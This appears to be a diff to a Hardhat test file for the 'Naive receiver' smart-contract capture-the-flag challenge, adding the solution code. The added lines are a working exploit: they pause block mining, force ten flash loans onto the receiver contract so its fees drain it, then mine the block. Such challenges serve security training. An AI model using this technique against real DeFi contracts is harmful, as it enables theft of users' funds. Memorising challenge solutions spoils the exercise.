@@ -37,7 +37,12 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        /** CODE YOUR EXPLOIT HERE */
+        await network.provider.send("evm_setAutomine", [false]);
+        for (let i = 0; i < 10; i++) {
+            await this.pool.flashLoan(this.receiver.address, 1);
+        }
+        await network.provider.send("evm_mine", []);
     });
 
     after(async function () {
